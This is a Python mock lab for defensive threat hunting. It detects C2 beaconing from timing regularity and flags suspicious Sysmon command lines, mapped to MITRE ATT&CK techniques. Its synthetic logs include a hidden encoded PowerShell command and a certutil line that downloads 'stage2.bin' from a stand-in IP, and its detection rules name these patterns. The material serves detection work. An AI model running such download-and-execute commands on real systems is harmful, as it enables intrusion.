#!/usr/bin/env python3
"""
Local Mock Lab — spec_cyber_hunt (CyberOps Proactive Threat Hunting: MITRE ATT&CK, C2 Beaconing & LOLBins)
Simulates hypothesis-driven threat hunting over synthetic Sysmon + DNS telemetry to detect:
1) Periodic C2 HTTP/DNS beaconing (sorted inter-arrival CV with >=4 observations minimum guard),
2) Suspicious PowerShell encoded command + LOLBin (certutil) download,
3) Mapping detections to MITRE ATT&CK Tactics/Techniques while suppressing benign admin activity.
No real SIEM, EDR, Zeek sensor, or live malware is executed.
"""

import json
import statistics


def detect_beaconing(timestamps_sec: list[int], max_jitter_ratio: float = 0.08) -> dict:
    if len(timestamps_sec) < 4:
        return {
            "intervals_sec": [],
            "mean_interval_sec": 0.0,
            "jitter_ratio": None,
            "beaconing_suspected": False,
            "reason": "Need at least 4 observations to assess periodic beaconing",
            "mitre_attack": None,
        }
    ordered = sorted(timestamps_sec)
    deltas = [b - a for a, b in zip(ordered, ordered[1:])]
    mean_d = statistics.mean(deltas)
    stdev_d = statistics.pstdev(deltas)
    if mean_d <= 0:
        return {
            "intervals_sec": deltas,
            "mean_interval_sec": 0.0,
            "jitter_ratio": None,
            "beaconing_suspected": False,
            "reason": "Non-positive mean inter-arrival interval",
            "mitre_attack": None,
        }
    jitter_ratio = round(stdev_d / mean_d, 4)
    suspected = jitter_ratio <= max_jitter_ratio
    return {
        "intervals_sec": deltas,
        "mean_interval_sec": round(mean_d, 2),
        "jitter_ratio": jitter_ratio,
        "beaconing_suspected": suspected,
        "mitre_attack": "T1071.001 / TA0011 (Command and Control)" if suspected else None,
    }


def hunt_sysmon_events(events: list[dict]) -> list[dict]:
    findings = []
    for ev in events:
        cmd = ev["command_line"].lower()
        if "powershell" in cmd and ("-enc" in cmd or "-encodedcommand" in cmd):
            findings.append({
                "host": ev["host"],
                "process": ev["process"],
                "severity": "HIGH",
                "hypothesis": "Obfuscated PowerShell Execution",
                "mitre_tactic": "TA0002 Execution",
                "mitre_technique": "T1059.001 (PowerShell)",
            })
        elif "certutil" in cmd and "-urlcache" in cmd:
            findings.append({
                "host": ev["host"],
                "process": ev["process"],
                "severity": "HIGH",
                "hypothesis": "LOLBin Ingress Tool Transfer via certutil",
                "mitre_tactic": "TA0011 Command and Control",
                "mitre_technique": "T1105 (Ingress Tool Transfer)",
            })
    return findings


def main() -> None:
    c2_beacon_times = [300, 0, 180, 60, 361, 121, 242]  # Intentionally unsorted raw log order
    normal_browsing_times = [0, 14, 180, 195, 620, 625, 1100]
    too_few_samples = [0, 60]
    sysmon_logs = [
        {"host": "WKSTN-FIN-09", "process": "powershell.exe", "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA..."},
        {"host": "WKSTN-FIN-09", "process": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://198.51.100.77/stage2.bin"},
        {"host": "SRV-BACKUP-01", "process": "robocopy.exe", "command_line": "robocopy D:\\Data \\\\NAS01\\Backup /MIR"},
    ]
    c2_res = detect_beaconing(c2_beacon_times)
    benign_res = detect_beaconing(normal_browsing_times)
    few_res = detect_beaconing(too_few_samples)
    sysmon_hits = hunt_sysmon_events(sysmon_logs)

    assert c2_res["beaconing_suspected"] is True
    assert benign_res["beaconing_suspected"] is False
    assert few_res["beaconing_suspected"] is False
    assert len(sysmon_hits) == 2

    report = {
        "mode": "LOCAL_MOCK_NO_REAL_SIEM_EDR_OR_MALWARE",
        "c2_beaconing_analysis": {
            "suspicious_host_10_10_40_19_unsorted_logs": c2_res,
            "benign_user_10_10_40_22": benign_res,
            "insufficient_samples_guard": few_res,
        },
        "sysmon_lolbin_findings": sysmon_hits,
        "benign_events_filtered": len(sysmon_logs) - len(sysmon_hits),
    }
    print(json.dumps(report, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
